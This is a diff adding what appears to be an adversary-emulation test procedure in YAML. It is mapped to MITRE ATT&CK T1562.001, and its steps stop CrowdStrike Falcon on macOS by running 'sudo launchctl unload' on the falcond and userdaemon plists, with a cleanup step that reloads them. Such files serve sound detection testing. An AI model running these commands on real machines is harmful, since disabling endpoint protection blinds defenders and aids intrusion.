@@ -1,0 +1,33 @@
+api_version: "2.0"
+name: Stop and unload Crowdstrike Falcon on macOS
+description: |
+    Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS
+args:
+    - name: falcond_plist
+      type: path
+      default: /Library/LaunchDaemons/com.crowdstrike.falcond.plist
+    - name: userdaemon_plist
+      type: path
+      default: /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
+uuid: b3e7510c-2d4c-4249-a33f-591a2bc83eef
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1562: Impair Defenses'
+    subtechniques:
+        - 'T1562.001: Disable or Modify Tools'
+requirements:
+    platforms:
+        - os: macos
+steps:
+    - name: stop-and-unload-crowdstrike-falcon-on-macos
+      inline: |
+        sudo launchctl unload {{.Args.falcond_plist}}
+        sudo launchctl unload {{.Args.userdaemon_plist}}
+      executor: sh
+      cleanup:
+        inline: |
+            sudo launchctl load -w {{.Args.falcond_plist}}
+            sudo launchctl load -w {{.Args.userdaemon_plist}}
+        executor: sh
